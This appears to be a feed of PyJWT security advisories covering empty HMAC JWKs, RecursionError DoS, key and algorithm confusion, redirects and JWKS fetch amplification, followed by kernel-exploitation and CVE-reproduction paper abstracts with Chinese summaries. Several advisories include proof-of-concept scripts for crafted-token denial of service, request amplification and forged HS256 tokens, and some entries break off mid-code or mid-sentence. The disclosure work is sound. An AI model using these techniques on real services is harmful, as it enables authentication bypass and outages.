items.title: PyJWT: PyJWK accepts empty HMAC keys, bypassing PyJWT's empty-key validation
items.summary:
### Summary

A service that verifies HS256 tokens using an empty oct JWK through PyJWK, including a PyJWK obtained from PyJWKSet, can therefore accept attacker-generated tokens as authenticated.

PyJWT 2.13.0 rejects an empty HMAC key when it is supplied through the raw `str`/`bytes` key path, but accepts the same zero-length key when it is supplied as a symmetric `PyJWK`.

An `oct` JWK containing an empty Base64URL key value:

```json
{"kty":"oct","k":""}
```

is decoded to `b""`. During signature verification, the `PyJWK` path uses this decoded value directly and does not invoke the empty-key validation in `HMACAlgorithm.prepare_key`. With the default `enforce_minimum_key_length=False`, PyJWT emits a warning and proceeds with HMAC verification using the zero-length key.

An attacker can independently calculate `HMAC-SHA256(b"", signing_input)` and create valid HS256 JWTs with arbitrary claims. A service that verifies HS256 tokens using an empty `oct` JWK through `PyJWK` or `PyJWKSet` can therefore accept attacker-generated tokens as authenticated.

The application must already contain an empty HMAC JWK, for example because a missing Base64URL configuration or secret-manager value was serialized as `"k": ""`. The attacker does not need control of the JWK/JWKS source, a signing oracle, a private key, or a mixed algorithm allow-list.

### Details

The vulnerability is caused by inconsistent validation of the same HMAC key material depending on whether it enters PyJWT as a raw key or through `PyJWK`.

#### Raw empty HMAC keys are rejected

[`[HMACAlgorithm.prepare_key](https://github.com/jpadilla/pyjwt/blob/7144e4534c34810f4525dc4578a32addd8212cff/jwt/algorithms.py#L325-L357)`](https://github.com/jpadilla/pyjwt/blob/7144e4534c34810f4525dc4578a32addd8212cff/jwt/algorithms.py#L325-L357) rejects an empty HMAC key.

As a result, an empty raw key is rejected in PyJWT 2.13.0:

```python
jwt.decode(token, b"", algorithms=["HS256"])
```

with `InvalidKeyError`.

#### Empty `oct` JWKs decode to the same key but are accepted

[`[HMACAlgorithm.from_jwk](https://github.com/jpadilla/pyjwt/blob/7144e4534c34810f4525dc4578a32addd8212cff/jwt/algorithms.py#L379-L394)`](https://github.com/jpadilla/pyjwt/blob/7144e4534c34810f4525dc4578a32addd8212cff/jwt/algorithms.py#L379-L394) handles symmetric JWKs.

For:

```json
{
    "kty": "oct",
    "k": ""
}
```

the empty Base64URL value is decoded to:

```python
b""
```

and returned without an emptiness check.

[`[PyJWK.__init__](https://github.com/jpadilla/pyjwt/blob/7144e4534c34810f4525dc4578a32addd8212cff/jwt/api_jwk.py#L73-L82)`](https://github.com/jpadilla/pyjwt/blob/7144e4534c34810f4525dc4578a32addd8212cff/jwt/api_jwk.py#L73-L82) then stores the decoded value in `self.key`.

The resulting `PyJWK` therefore contains the same zero-length byte string rejected by the raw-key path.

#### `PyJWK` verification bypasses the raw-key validation

[`[PyJWS._verify_signature](https://github.com/jpadilla/pyjwt/blob/7144e4534c34810f4525dc4578a32addd8212cff/jwt/api_jws.py#L389-L416)`](https://github.com/jpadilla/pyjwt/blob/7144e4534c34810f4525dc4578a32addd8212cff/jwt/api_jws.py#L389-L416) has a separate path for `PyJWK` objects.

When a `PyJWK` is supplied, verification uses its already-decoded key directly:

```python
prepared_key = key.key
```

The value is not passed through:

```python
alg_obj.prepare_key(key.key)
```

so the empty-key check in `HMACAlgorithm.prepare_key` is never reached.

The minimum HMAC key-length check does not reject the key under the default configuration. With `enforce_minimum_key_length=False`, PyJWT emits a warning and continues signature verification.

The verifier therefore receives:

```python
b""
```

as the HS256 key.

This creates the following difference for identical cryptographic key material:

```text
raw b""
    -> HMACAlgorithm.prepare_key
    -> InvalidKeyError

{"kty":"oct","k":""}
    -> HMACAlgorithm.from_jwk
    -> b""
    -> PyJWK.key
    -> PyJWS._verify_signature

items.title: PyJWT: Uncaught RecursionError in jwt.decode() on deeply nested token header
items.summary:
## Package

pyjwt (PyPI)

## Affected versions

tested & verified on: 2.13.0. Every version whose `PyJWS._load()` translates only `ValueError` is affected

## Description

`PyJWS._looad()` (`jwt/api_jws.py:337`) splits the compact token, base64url decodes the header segment and hands it to `json.loads()` before `_verify_signature()` runs. The parse is wrapped in `except ValueError as e: raise DecodeError(...)`. That is what makes the documented contract sufficient for untrusted input: `except jwt.PyJWTError` (or `InvalidTokenError`) around `jwt.decode(token, key, algorithms=[...])`.

CPython's JSON decoder raises `RecursionError` (a `RuntimeError` subclass, not a `ValueError`) once nesting crosses the native stack guard. That exception leaves `_load()`, then `jwt.decode()`, and matches no `PyJWTError` handlerr at all. No key and no valid signature are needed: the header is parsed first, so a single unauthenticated request with an unsigned token suffices.

Scope: the recursion threshold is ~65,000 nesting levels; below it the same input yields a clean `DecodeError` (a 346,800-byte flat header is rejected normally, so depth, not size, is the trigger). A token this large cannot ride in an `Authorization` header (rejected at HTTP field limits,431 under gunicorn), but body transport (RFC 7662 introspection style) is a standard pattern. Under Flask 3.1.3 / gunicorn 26.2.0 each crafted request returns HTTP 500 instead of 401 and writes a full traceback to the error log; the sync worker survives.

## Proof of concept

Against any endpoint that validates a token from its JSON body with the documented pattern:

```python
import base64, json, http.client

def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

# unsigned token: the header segment is 200,000 nested '[' (266,681 bytes total)
token = (b64url(b"[" * 200_000) + b"." + b64url(b'{"a":1}') + b"." + b64url(b"x")).decode()

conn = http.client.HTTPConnection("127.0.0.1", 8125, timeout=30)
conn.request("POST", "/api/protected", body=json.dumps({"token": token}),
             headers={"Content-Type": "application/json"})
print(conn.getresponse().status)   # 500, expected 401
```

Determinism: 20/20 crafted requests returned 500 against the reference container (PyJWT 2.13.0, Flask 3.1.3, gunicorn 26.2.0, Python 3.14.7) in 0.12 s (about 6 ms per request in a tight loop, 14 ms for a cold request), each leaving a `RecursionError: Stack overflow ... while decoding a JSON array` traceback in the error log.

## Impact

An unauthenticated attacker can turn every request to a JWT validating endpoint into a server error with a full traceback logged per request, a cheap and repeatable denial of service on the authentication path (no crash, no data exposure).

## Fix

Catch `RecursionError` alongside `ValueError` in `_load()` and raise `DecodeError`, or parse the header with a nonrecursive, depthbounded parser.

## Reproduction

A standalone package (docker-compose.yml, Dockerfile, requirements.txt, target app, driver) accompanies this report:

```
cd <package dir>
docker compose up -d --build
python3 poc_check_then_attack.py
docker compose down -v
```
[poc_pyjwt_recursion.zip](https://github.com/user-attachments/files/31614987/poc_pyjwt_recursion.zip)

Exit 0= reproduced (control checks green, exactly one crafted request returns 500, traceback verified in `docker logs`, service alive afterwards); 1 = not reproduced; 2 = checks failed, no attack sent. The package's `run_log.txt` documents a complete proof run.

## Credits

- @Nivid42

## Maintainer update — 2026-09-09

We reproduced the reported behavior on PyJWT 2.13.0: a deeply nested JSON array in the untrusted compact-JWS header reaches `json.loads()` before signature verification and raises `RecursionError`, which is not a `PyJWTError`. The same input is accepted by the public `jwt.decode()` path and can escape an application's normal `except PyJWTError` handling.

The fix is committed as `06573692ebcdec8831c3927513b3e87c31fbbb62`.

items.title: PyJWT accepts public JWK containers as HMAC secrets
items.summary:
### Summary

PyJWT 2.13.0 contains an incomplete defense against algorithm confusion when
an application mixes symmetric and asymmetric algorithms in one verification
path. A public RSA, EC, or OKP JWK can be accepted as an HMAC secret when it
is wrapped in a JWKS object, nested in an array, or represented in another
container form that does not expose a top-level `kty` member.

### Impact

An attacker who knows the public key material can forge HS256/HS384/HS512
tokens if the application simultaneously:

* allows both HS* and asymmetric algorithms;
* passes raw public JWK/JWKS JSON as `key=`; and
* uses that same value as the HMAC secret.

This can allow forged JWT claims in affected application configurations. The
issue does not affect applications that keep symmetric and asymmetric
verification paths separate and follow PyJWT's algorithm-selection guidance.

### Fix status

The fix is on `master` in commit `801cd12` (`fix: reject public JWK container
HMAC keys`). `HMACAlgorithm.prepare_key` now rejects public JWK members found in
objects, arrays, nested containers, BOM/UTF variants, and recursion-limit
inputs. It also recognizes escaped JSON member names without treating ordinary
string values as JWKs. Ordinary JSON secrets remain accepted byte-for-byte.

The change was tested with focused regression tests and the full local tox
matrix. Available Python 3.9, 3.12, and 3.13 crypto/no-crypto suites, mypy,
package metadata, and coverage passed; unavailable interpreters were skipped
by the project configuration. A fresh independent Astra/max security review
accepted the final diff with no blocking findings.

The affected range is `= 2.13.0`. The fix is on the unreleased development
branch; the patched version will be recorded when a released 2.x version
containing the fix is available. This advisory is being moved to draft pending
that release.

### Reporter credit

Credit: Charles Vosburgh / Trilobyte.

### Original report

The original report and reproduction package are retained in the private
advisory record.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

items.title: PyJWT: PyJWKClient follows redirects when fetching JWKS
items.summary:
### Summary

PyJWT 2.13.0 `PyJWKClient` followed HTTP redirects while fetching a JWKS,
without validating the redirect destination. A configured trusted endpoint
could therefore redirect the client to a different host.

### Impact

When an application uses `PyJWKClient` with caller-supplied request headers and
an attacker can influence the configured endpoint's response, the redirected
request could expose those headers and the redirected response could be used as
authoritative key material. This could cause JWKS trust poisoning and, in
affected mixed-configuration applications, forged JWT acceptance. The issue
requires an attacker-influenced redirect from the configured JWKS endpoint; it
is not triggered by a token `kid` alone.

### Affected versions

PyJWT `<= 2.13.0`.

### Fix

The issue is fixed on `master` in commit
[`0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56`](https://github.com/jpadilla/pyjwt/commit/0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56).
`PyJWKClient` now disables automatic redirects for JWKS fetches. Regression
tests verify that a redirect is rejected without contacting its destination,
while normal fetches, headers, caching, errors, timeouts, and SSL context remain
covered.

The fix is present in the unreleased development branch. The patched version
will be recorded after a released PyJWT 2.x version containing the fix is
confirmed.

### Credit

Credit: the original reporter of GHSA-9v7f-9g4p-ffgj. Additional redirect
header-leak and cache-poisoning evidence from the newer duplicate report
GHSA-43g3-98cx-x446 is preserved in the duplicate record and informed this
canonical advisory update.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

items.title: PyJWT: Public keys in DER form are accepted as HMAC secrets, bypassing the CVE-2022-29217 guard
items.summary:
### Summary

`HMACAlgorithm.prepare_key` blocks asymmetric keys from being used as HMAC secrets by searching for text markers only. It looks for `-----BEGIN` and for an `ssh-` prefix. The same key in DER form is binary ASN.1 and has neither marker, so it passes the check and is used as an HMAC secret.

An application that verifies tokens with an RSA or EC public key, and also allows HS256 with that same key, can be given a forged token. The attacker signs it with the public key, which is public. This is the key confusion problem CVE-2022-29217 was filed for, reachable again through a different encoding.

The reach is smaller than the original CVE. The application must already be in that misconfiguration, and it must hold its public key as DER bytes rather than PEM.

### Details

The guard is at `jwt/algorithms.py:331`:

```python
if is_pem_format(key_bytes) or is_ssh_key(key_bytes):
    raise InvalidKeyError(
        "The specified key is an asymmetric key or x509 certificate and"
        " should not be used as an HMAC secret."
    )
```

Both helpers are text matchers. Neither one parses the key.

- `jwt/utils.py:126`, `is_pem_format`, runs a regex for `----[- ]BEGIN ...----`.
- `jwt/utils.py:141`, `is_ssh_key`, checks `startswith` against a list of `ssh-` and `ecdsa-sha2-` prefixes.

A DER encoded public key starts with the bytes `0x30 0x82`. It matches neither, so `prepare_key` returns it unchanged and it becomes the HMAC secret.

There is no DER handling anywhere in the package. `grep -rni "\bDER\b|load_der" jwt/ tests/` returns nothing.

This affects three encodings that are all blocked in their PEM form today:

- DER SubjectPublicKeyInfo
- DER PKCS#1
- DER encoded X.509 certificate

History of this guard:

- Added in 2.4.0 for CVE-2022-29217 and GHSA-ffqj-6fqr-9h24, covering PEM and SSH.
- Extended in 2.13.0 for GHSA-xgmm-8j9v-c9wx, covering JWK JSON documents.
- DER has never been covered.

Applications that use `PyJWK` or `PyJWKClient` are not affected. `jwt/api_jws.py:395` binds the header `alg` to the key's own algorithm, so HS256 never reaches `HMACAlgorithm.prepare_key` on that path.

Suggested fix: try to parse the bytes as a key and reject if parsing works. For example `load_der_public_key`, `load_der_private_key` and `load_der_x509_certificate` in a try/except chain, next to the checks already there. A random HMAC secret will not parse as valid DER, so real secrets should not be rejected.

### PoC

Tested on 2.4.0, on 2.13.0, and on main at commit `7144e4534`. All three behave the same. The guard has been marker based since 2.4.0, so the versions in between are very likely affected as well.

```console
pip install "pyjwt==2.13.0" cryptography
python poc.py
```

No special configuration is needed. The script builds its own key.

```python
import base64
import hashlib
import hmac
import json

import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

pub = rsa.generate_private_key(public_exponent=65537, key_size=2048).public_key()
pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
der = pub.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
der_pkcs1 = pub.public_bytes(Encoding.DER, PublicFormat.PKCS1)


def b64(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def forge(secret):

items.title: PyJWT BOM Bypass
items.summary:
## Affected Package

- **Package**: PyJWT (`pyjwt` on PyPI)
- **Repository**: https://www.google.com/url?q=https://github.com/jpadilla/pyjwt&source=gmail&ust=1781794518474000&sa=E
- **Affected version**: 2.13.0
- **Vulnerability class**: Algorithm confusion / patch bypass

---

## Root Cause

PyJWT 2.13.0 introduced a guard in `HMACAlgorithm.prepare_key()` (file `jwt/algorithms.py`, approximately line 344) to prevent RSA public key material from being used as an HMAC secret — the root cause of CVE-2026-48526.

The guard uses `bytes.lstrip()` before calling `startswith(b"{")`:

```python
stripped = key_bytes.lstrip() # strips ASCII whitespace only
if stripped.startswith(b"{"): # JWK detection
 ...
 raise InvalidKeyError("The specified key is an asymmetric key...")
```

`bytes.lstrip()` with no argument removes only bytes in the ASCII whitespace set (`\x20 \t \n \r \x0b \x0c`). A UTF-8 BOM prefix (`\xef\xbb\xbf`) is not stripped, so `stripped.startswith(b"{")` returns `False` for any BOM-prefixed JWK JSON. The JWK detection block is never entered, and the RSA public key bytes are silently accepted as the HMAC-SHA256 secret.

---

## PoC Sketch (pseudocode — not a weaponized payload)

```python
# 1. Attacker obtains RSA public key JWK (e.g., from /jwks.json endpoint)
# and prepends a UTF-8 BOM byte sequence before the JSON opening brace.
# 2. Attacker signs a JWT using HS256, with the BOM-prefixed JWK as the secret.
# 3. Attacker submits the forged token to a verifier that:
# - accepts algorithms=["HS256", "RS256"]
# - holds the same RSA public key as raw bytes (BOM-prefixed key file)
# 4. PyJWT 2.13.0 accepts the token because the BOM causes the JWK
# detection check to be skipped — the RSA JWK bytes become a valid HMAC key.
# Result: arbitrary claims (role, sub, etc.) accepted by the verifier.
```

---

## Impact

An unauthenticated network attacker who knows the target application's RSA public key — which is public by design and obtainable from a JWKS endpoint or certificate — can forge JWT tokens containing arbitrary claims and have them accepted by a PyJWT 2.13.0 verifier configured with a mixed algorithm set (`algorithms=["HS256", "RS256"]` or equivalent). The resulting impact
is complete authentication and authorization bypass (`C:H/I:H`). Attack Complexity is High (`AC:H`) because the attacker must obtain the RSA public key and the verifier must use a mixed-algorithm configuration; no authentication is required (`PR:N`). This is a patch bypass: users who upgraded to 2.13.0 specifically to remediate CVE-2026-48526 remain vulnerable.

---

## Suggested Fix

**Option A (minimal)**: Replace `lstrip()` with an explicit strip of known
BOM prefixes before the JSON detection check:

```python
# Strip common BOM prefixes in addition to ASCII whitespace
BOM_PREFIXES = (b"\xef\xbb\xbf", b"\xff\xfe", b"\xfe\xff")
stripped = key_bytes
for bom in BOM_PREFIXES:
 if stripped.startswith(bom):
 stripped = stripped[len(bom):]
 break
stripped = stripped.lstrip()
```

**Option B (more robust)**: Use `json.loads()` as the detection mechanism
instead of a byte-prefix check, so encoding variants and whitespace are
handled by the JSON parser:

```python
try:
 test_obj = json.loads(key_bytes.strip())
 if isinstance(test_obj, dict) and "kty" in test_obj:
 raise InvalidKeyError("The specified key is an asymmetric key...")
except (ValueError, UnicodeDecodeError):
 pass
```

Option B is preferred because it is resilient to any future encoding variant.

---

## Maintainer update — 2026-09-09

We reproduced the reported algorithm-confusion path on PyJWT 2.13.0. When an application passes a raw public RSA JWK as the key and allows both an asymmetric and HMAC algorithm, a forged HS256 token signed with the known public JWK bytes is accepted when the JWK is represented in encodings accepted by Python's JSON decoder. The normal raw-JWK, asymmetric-only, and algorithm-bound `PyJWK` controls reject the token. This is an application configuration precondition,

items.title: PyJWT: PyJWKClient still amplifies unauthenticated JWKS fetches on unknown kid values (incomplete fix of CVE-2026-48524)
items.summary:
Summary
CVE-2026-48524 (GHSA-fhv5-28vv-h8m8, "PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS)") was fixed in 2.13.0 by stopping fetch_data() from clearing the cache on a fetch error. That closed one amplification path but did not add the mitigation the advisory's title implies: there is still no rate-limit, negative-cache, or minimum-refresh-interval for unknown kids.

At HEAD, get_signing_key(kid) (jwt/jwks_client.py:185-211), on any unknown kid, calls get_signing_keys(refresh=True), and refresh=True bypasses jwk_set_cache unconditionally and forces a fresh fetch_data(). The kid is read from the unverified token header (get_signing_key_from_jwt decodes with verify_signature=False), so no valid token and no authentication is required. lru_cache does not cache the raised exception, so even the same unknown kid repeated re-fetches on every call.

Affected
pyjwt <= 2.13.0 (the latest release; the patched release for CVE-2026-48524). No fixed version yet.

Proof of concept (verified on 2.13.0, cache enabled = realistic prod config)
import threading, http.server, socketserver, json
from jwt import PyJWKClient
hits = {'n': 0}
JWKS = json.dumps({"keys":[{"kty":"oct","kid":"real","k":"AAAA"}]}).encode()
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        hits['n'] += 1
        self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()
        self.wfile.write(JWKS)
    def log_message(self,*a): pass
srv = socketserver.TCPServer(('[127.0.0.1](https://127.0.0.1/)',0), H); port = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()
c = PyJWKClient(f'http://127.0.0.1/:{port}[/jwks](tg://bot_command?command=jwks).json', cache_keys=True, lifespan=3600)
for i in range(8):
    try: c.get_signing_key(f'attacker-unknown-kid-{i}')
    except Exception: pass
before = hits['n']
for _ in range(5):
    try: c.get_signing_key('same-unknown')
    except Exception: pass
print('distinct unknown kids: 8 -> fetches:', hits['n'])
print('same unknown kid x5 -> extra fetches:', hits['n'] - before)

Output:
  distinct unknown kids: 8 -> fetches: 9
  same unknown kid x5 -> extra fetches: 5
Each unknown kid forces a fresh JWKS fetch; a repeated identical unknown kid still re-fetches every time against an unexpired cache. No rate-limit or negative-cache.

Impact
One unauthenticated request -> one outbound JWKS HTTP fetch + full JSON parse on the victim server. An attacker floods tokens carrying junk kids, so the victim hammers its own JWKS/IdP endpoint (amplification: attacker -> victim -> IdP), exhausting victim CPU/sockets and potentially tripping the JWKS provider's rate-limit, causing an application-wide auth outage. This is the unauthenticated DoS the parent advisory is named for, still reachable after the 2.13.0 fix.

Suggested fix
Guard the forced refresh on unknown kids: negative-cache unknown kids for a short TTL, or enforce a minimum interval between forced JWKS refreshes, so a repeated or unknown kid cannot force unbounded fetches.

Note: the same-kid-repeated result (5 identical unknown kids producing 5 fetches against an unexpired cache) shows this is request amplification, not legitimate key-rotation handling, since that refresh can never succeed.

Reported by Babakizo (Securva).

## Maintainer update — 2026-09-10

The maintainer confirmed the reported behavior against PyJWT 2.13.0. With JWKS caching
enabled, an unknown `kid` previously forced an unconditional JWKS refresh,
including when the same unknown value was repeated while the cached key set was
still valid. This allowed unauthenticated token headers to cause unnecessary
outbound JWKS requests and repeated parsing work.

The fix is now on `master` in commit `ba4853a`. `PyJWKClient` now applies a
30-second cooldown after successful JWKS fetches before permitting another
unknown-`kid` refresh, serializes concurrent refresh decisions per client, and
allows callers

items.title: Harvest Season for SLUB: From io_uring vulnerability to Novel Sheaf-Based Exploitation Techniques
items.summary: The Linux kernel's push for higher I/O performance and more efficient memory management has introduced new mechanisms that, while improving performance, also open new attack surfaces. This research examines two of them together: the io_uring subsystem and the sheaf/barn caching mechanism added to the SLUB allocator in Linux 6.18. In this research, two previously unknown vulnerabilities in io_uring are presented, and one is developed into a complete local privilege escalation chain under a hardened kernel configuration. Building this chain revealed that the sheaf/barn mechanism changes long-standing assumptions behind established exploitation techniques such as cross-cache attack, and that its design also weakens existing SLUB freelist protections. Both observations are analyzed and turned into working primitives. Building on this analysis, three novel sheaf-based exploitation techniques are proposed. Among them, an RCU-sheaf cross-cache technique removes the traditional dependence on the buddy system for moving objects across caches, giving more flexible and reliable control over object migration between cache pools. Together, these results characterize the sheaf/barn layer as a new and largely unexplored attack surface in Linux kernel exploitation.

llm_summary.summary_zh: 该论文关注 Linux 内核为提升 I/O 性能与内存管理效率而引入的新机制所带来的安全副作用，并聚焦两个相互关联的目标：一是 io_uring 异步 I/O 子系统，二是 Linux 6.18 中为 SLUB 分配器新增的 sheaf/barn（束/仓）缓存机制。研究者在这一交叉领域报告了两个此前未知的 io_uring 漏洞，并将其中的一个发展为在启用内核加固配置的前提下仍可完成的完整本地权限提升链。在构造该链条的过程中，作者发现 sheaf/barn 机制动摇了若干既有利用技术的长期前提假设——例如跨缓存（cross-cache）攻击所依赖的对象迁移模型——同时其设计本身也削弱了现有 SLUB 空闲链表（freelist）保护的有效性。论文对这两点观察分别进行了分析，并将其转化为可复用的原语。在此基础上，作者提出了三种面向 sheaf 的新型利用技术；其中一种基于 RCU 与 sheaf 结合的跨缓存技术，摆脱了传统上必须借助 buddy（伙伴）系统才能实现对象跨缓存迁移的依赖，从而对缓存池之间的对象迁移提供了更灵活、更可靠的控制能力。总体而言，论文的贡献可归纳为：披露两个 io_uring 新漏洞并给出一个完整 LPE 链；系统性地刻画 sheaf/barn 对既有利用范式与缓解措施的冲击；提出三类新的 sheaf 相关原语与技术；并论证 sheaf/barn 层构成 Linux 内核中一个全新且尚未被充分探索的攻击面。适合内核安全研究人员、漏洞挖掘与利用缓解方向的工程师、以及负责 Linux 发行版内核加固与补丁跟进的安全团队阅读。
llm_summary.why_it_matters_zh: 它把 io_uring 与 Linux 6.18 新增的 SLUB sheaf/barn 缓存并列为攻击面，并声称在加固内核上完成了 LPE 链，还指出该机制削弱了既有 freelist 保护、动摇了 cross-cache 的前提。对内核加固与发行版补丁跟进有直接参考价值。
llm_summary.impact_zh: 影响面覆盖使用 io_uring 的 Linux 服务器、容器与云主机，尤其是升级到 6.18 及之后内核的发行版；对依赖 SLUB 缓解措施（freelist 加固、cross-cache 防御假设）的内核安全设计与红蓝对抗评估方法同样具有迁移价值。
detection_signals_zh: 容器/主机上 io_uring 相关系统调用（如 io_uring_setup/enter/register）的高频或异常调用组合，尤其是来自非预期进程或低权限用户
短时间内出现大量 slab 缓存创建/销毁、跨缓存对象迁移特征的内核告警（配合 SLUB debug、KASAN、slabinfo 监控）
内核版本处于 6.18 且启用了 sheaf/barn 相关路径的主机，其异常内存分配模式与 OOM/内存碎片指标偏离基线
针对 io_uring 内核线程与工作队列的异常 CPU/内存占用，或权限提升后出现的可疑凭据变更与应用崩溃序列
defense_advice_zh: 盘点资产中内核版本与是否启用 io_uring；对不需要异步 I/O 的业务，通过 seccomp 或配置限制 io_uring 系统调用面
优先跟进上游 io_uring 与 SLUB（sheaf/barn）相关修复补丁，纳入内核版本升级与热补丁流程
在测试与生产环境开启 SLUB 调试、KASAN/KFENCE、init_on_free/init_on_alloc 等加固选项，验证现有缓解措施在新缓存机制下是否仍有效
对依赖 cross-cache 防护假设的自研检测规则与内核加固基线进行复核，重新评估其在 6.18+ 上的覆盖度
对高价值主机启用内存分配异常与权限提升行为的内核审计遥测，并纳入 SOC 关联分析

items.title: One Pipeline Does Not Fit All: TAILOR, a Type- and State-Aware Framework for CVE Reproduction
items.summary: Growing vulnerability disclosure and widespread software reuse increase security teams' need for reproducible evidence to diagnose vulnerabilities, validate patches, and build regression tests. Producing such evidence at scale requires automated end-to-end CVE reproduction. Existing methods typically process different CVEs through a uniform pipeline, but differences in runtime form, trigger interfaces, and prerequisite state impose different execution requirements on individual stages, making fixed workflows difficult to adapt to diverse reproduction needs. To address this problem, we present TAILOR, a type- and state-aware multi-agent framework specialized for complex vulnerability reproduction. TAILOR converts static vulnerability information into auditable reproduction evidence and packages reconstructed environments and trigger evidence into reproduction artifacts. Its first-level type-aware mechanism adaptively matches each vulnerability to an execution path. Within the Web path, its second-level state-aware mechanism constructs the required prerequisite state before exploitation, decouples prerequisite-state construction from core vulnerability triggering, and shares execution constraints across exploitation and verification. We construct a dataset of 200 CVEs with an emphasis on cases with complex execution requirements. TAILOR successfully reproduces 59.24\% of Web vulnerabilities and 44.19\% of traditional vulnerabilities. Further ablation experiments show that the two control levels respectively mitigate execution-path mismatch and missing Web prerequisite state. Overall, TAILOR broadens the coverage of automated CVE reproduction and provides auditable evidence for vulnerability diagnosis and defense.

llm_summary.summary_zh: 该论文关注大规模漏洞披露与软件复用背景下的一个现实痛点：安全团队需要可复现的证据来诊断漏洞、验证补丁、构建回归测试，而端到端的自动化 CVE 复现是规模化生产此类证据的前提。作者指出，现有方法通常用一条统一的流水线处理所有 CVE，但不同漏洞在运行时形态（runtime form）、触发接口（trigger interfaces）和前置状态（prerequisite state）上差异巨大，导致同一套固定工作流难以适配各阶段不同的执行要求，复现成功率受限。为此，论文提出 TAILOR——一个类型感知与状态感知的多智能体（multi-agent）框架，专门面向复杂漏洞复现。TAILOR 将静态漏洞信息转化为可审计的复现证据，并把重建出的环境和触发证据打包成可复现产物（reproduction artifacts）。其核心是两级控制机制：第一级为类型感知机制，按漏洞类型自适应匹配对应的执行路径（如 Web 路径与传统路径）；第二级为状态感知机制，仅在 Web 路径内部生效，负责在漏洞触发之前构造所需的前置状态，并把前置状态构造与核心漏洞触发解耦，同时在利用（exploitation）与验证（verification）之间共享执行约束。为评估该框架，作者构建了包含 200 个 CVE 的数据集，并侧重选取执行要求复杂的案例。实验中 TAILOR 成功复现了 59.24% 的 Web 类漏洞和 44.19% 的传统类漏洞。消融实验进一步表明，上述两级控制分别缓解了执行路径错配与 Web 前置状态缺失这两类失败原因。总体而言，TAILOR 扩展了自动化 CVE 复现的覆盖范围，为漏洞诊断与防御提供了可审计的证据基础。该工作属于防御侧工程与研究结合的方向，适合漏洞管理、补丁验证、自动化安全测试与安全运营研究者阅读。
llm_summary.why_it_matters_zh: 自动化 CVE 复现是补丁验证、回归测试与漏洞诊断的基础能力。该框架提出的类型/状态双级编排思路，可帮助安全团队提升复杂漏洞的复现成功率，并获得可审计证据，降低对人工逆向与环境搭建的依赖。
llm_summary.impact_zh: 可迁移至企业漏洞管理平台、补丁验证流水线、PoC 回归测试库与漏洞情报验证环节；对 Web 类漏洞（前置状态复杂）提升尤为明显。
detection_signals_zh: 自动化复现环境（容器/沙箱）中出现针对特定 CVE 的异常服务拉起、依赖安装与配置变更序列
同一主机上短时间内出现前置状态构造（建库、建账号、写配置）与随后触发请求分离的两段式行为
复现产物（镜像、快照、日志、触发证据）在内部制品库中的集中生成与分发行为
defense_advice_zh: 在隔离沙箱/实验网段内运行复现流水线，避免与生产网络直连并限制出网
对复现产出的环境镜像与证据包做完整性校验和来源审计，纳入制品库统一管控
将复现结果与厂商公告、补丁版本、KEV 等外部来源交叉验证后再用于决策
关注前置状态类失败原因，在内部测试用例中显式建模依赖服务、权限与配置前置条件

items.title: When Cyber Scoring Systems Diverge: An Empirical Comparison
items.summary: Vulnerability scoring systems underpin cyber patch prioritization and risk management, but their comparative behavior is almost always assessed in the abstract, through correlation studies in IT vulnerability databases, rather than by the operational consequences they produce when embedded in a system-level risk model. Here we present an empirical comparison of four vulnerability scoring systems, namely CVSS (Common Vulnerability Scoring System), EPSS (Exploit Prediction Scoring System), SSVC (Stakeholder-Specific-Vulnerability Categorization), and IronMiner (operationally calibrated proprietary scoring system). As a substrate for comparison, we use a reconstruction of the 2015 Ukraine Power Grid operational-technology (OT) network that provides a documented incident topology. The results show a high degree of disagreement between the scoring systems. This suggests that the choice of the scoring system could significantly influence mitigation strategies and vulnerability prioritization, implying that a composite or hybrid scoring approach could offer a more suitable solution.

llm_summary.summary_zh: 该论文针对漏洞评分体系在补丁优先级排序与风险管理中的实际效果展开实证比较。长期以来，CVSS、EPSS 等评分系统的对比研究多停留在抽象层面，例如在 IT 漏洞数据库中计算评分之间的统计相关性，而很少考察当这些评分被嵌入系统级风险模型后所产生的操作性后果。为此，作者选取四个评分体系：CVSS（通用漏洞评分系统）、EPSS（漏洞利用预测评分系统）、SSVC（利益相关方特定漏洞分类）以及 IronMiner（经运行数据校准的专有评分系统），并以 2015 年乌克兰电网运营技术（OT）网络的重建拓扑作为统一比较底座。该事件具备已被记录的攻防拓扑与事故路径，因此能够较真实地反映 OT 环境下优先级决策的差异。结果显示，四个评分体系之间的分歧程度很高：同一批漏洞在不同体系下得到的优先级排序差异显著。这意味着评分体系的选择会实质性地影响缓解策略制定、补丁排序与资源配置，进而影响安全运营的最终落点。作者据此提出，采用组合或混合评分方法可能比依赖单一体系更为合适。该工作适合漏洞管理、OT/ICS 安全、风险评估与安全运营流程设计人员阅读。
llm_summary.why_it_matters_zh: 评分体系分歧会直接决定 OT/IT 补丁优先级与资源配置；蓝队若单一依赖 CVSS 或 EPSS，可能漏掉位于真实攻击路径上、应优先修复的漏洞。该研究提示需以资产关键性与场景化模型校准评分。
llm_summary.impact_zh: 可迁移至漏洞管理流程、补丁优先级排序、OT/ICS 风险评估、SOC 工单优先级、混合评分体系设计与安全产品采购评估等场景。
detection_signals_zh: 同一漏洞在不同评分体系下优先级排序出现显著分歧
系统级风险模型输出的修复顺序与单一评分体系建议不一致
OT 环境中按通用评分排序的修复队列与实际攻击路径拓扑不匹配
defense_advice_zh: 在补丁优先级流程中并行运行多个评分维度，并对分歧项安排人工复核
